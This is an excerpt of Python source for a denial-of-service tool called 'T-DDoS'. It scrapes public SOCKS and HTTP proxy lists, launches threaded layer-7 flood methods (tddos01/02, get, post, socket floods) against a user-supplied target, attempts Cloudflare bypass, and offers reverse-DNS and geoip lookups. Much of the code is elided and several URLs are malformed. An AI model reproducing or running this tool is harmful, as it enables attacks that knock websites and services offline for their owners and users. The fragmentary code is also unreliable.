...
proxyResources = [
    'https://.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all',
...
def get_proxylist(type):
    if type == "SOCKS5":
        r = requests.get(
            "https://.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all").text
        r += requests.get("https://www.proxy-list.download//v1/get?type=socks5").text
        open("proxy.txt", 'w').write(r)
        r = r.rstrip().split('\r\n')
        return r
    elif type == "HTTP":
        r = requests.get(
            "https://.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all").text
        r += requests.get("https://www.proxy-list.download//v1/get?type=http").text
        open("proxy.txt", 'w').write(r)
        r = r.rstrip().split('\r\n')
        return r
...
proxy_resources = [
    ...
    'https://.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true',
    'https://www.proxyscan.io/download?type=socks5',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
    ...
    'https://.proxyscrape.com/?request=displayproxies&proxytype=http',
    ...
    'https://proxy-spider.com//proxies.example.txt',
    'https://multiproxy.org/txt_all/proxy.txt',
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
    'https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt',
    'https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt',
    'https://.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all',
    'https://proxylist.geonode.com//proxy-list?limit=50&page=1&sort_by=lastChecked&sort_type=desc',
    'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
...
# region testzone
def attacktddos02(target, t, threads):
    for i in range(int(threads)):
        threading.Thread(target=Launchtddos02, args=(target, t)).start()


def Launchtddos02(target, t):
...
def welcome():
  ...
  printf(Center.XCenter(Colorate.Vertical(Colors.red_to_blue, f'''
           ╦══╩═════════════T-DDoS═════════════╩══╦
                        {random.choice(wms)}
  ...
  while True:
    ...
    if 'credits' in cmdl:
      ...
      '''), True), end='')
        ...
        if get_cookie(target):
            ...
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
    elif 'tddos01' in cmdl or 'TDDOS01' in cmdl:
        if get_proxies():
            target, thread, t = get_info_l7()
            threading.Thread(target=attacktddos02, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif 'tddos02' in cmdl or 'TDDOS02' in cmdl:
        target, thread, t = get_info_l7()
    ...
    ##################################################################################
        ...
        try:
            ...
            exit()
        req = requests.get("https://.proxyscrape.com/?request=displayproxies&proxytype=http")
        ...
        target = input()
        try:
            r = requests.get(f"https://.hackertarget.com/subnetcalc/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the !')

    elif 'dns' in cmdl:
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "IP/DOMAIN " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://.hackertarget.com/reversedns/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the !')
        ...
        target = input()
        try:
            r = requests.get(f"https://.hackertarget.com/geoip/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the !')
      ...
      try:
        ...
        print((Colorate.Horizontal(Colors.red_to_blue, ' [!] Command not found.')))
    ######################################################################################
...
if __name__ == '__main__':
    ...
    if len(sys.argv) < 2:
        ...
        stdout.write(
            "Method: cfb, pxcfb, cfreq, cfsoc, tddos01, tddos02, get, post, head, soc, pxraw, pxsoc\n")
